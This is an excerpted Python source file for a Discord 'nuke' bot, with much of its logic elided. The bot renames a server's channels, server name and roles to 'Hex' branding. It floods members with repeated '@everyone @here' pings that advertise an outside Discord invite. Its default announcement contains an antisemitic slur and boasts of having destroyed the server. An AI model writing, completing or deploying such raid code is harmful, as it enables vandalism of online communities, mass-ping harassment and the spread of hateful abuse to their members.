...
PREM = 1542329268086902804
MOD_ROLE_ID = 1542329268086902804
...
class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Settings"):
    custom_channel_name = discord.ui.TextInput(
        label="Channel Name",
        placeholder="Numele canalelor (ex: nuked-by-Hex)",
        required=False,
        max_length=32,
        default=""
    )
...
async def perform_nuke(ctx, custom_mode: bool):
    ...
    if custom_mode:
        ...
        channel_name = custom_channel if custom_channel else "Hex"
        server_name = custom_server if custom_server else "Hex owns this"
        role_name = custom_role if custom_role else "hex-on-top"
        text_message = custom_msg if custom_msg else "@everyone @here join https://discord.gg/7D5YDGJJd9"
    else:
        channel_name = "Hex"
        server_name = "Hex owns this"
        role_name = "Hex-on-top"
        text_message = "@everyone @here join https://discord.gg/7D5YDGJJd9"
    ...
    if not custom_mode:
        embed_main = discord.Embed(
            ...
            description=(
                "@everyone @here HEX OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
                "**# HEX || SERVER SERVER NON HOOKED**\n"
                "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
                "https://discord.gg/7D5YDGJJd9\n\n"
            ...
            if custom_mode:
                ...
                if extra > 0:
                    for _ in range(extra):
                        ...
                        msg = ("@everyone @here join https://discord.com/7D5YDGJJd9\n") * ping_count
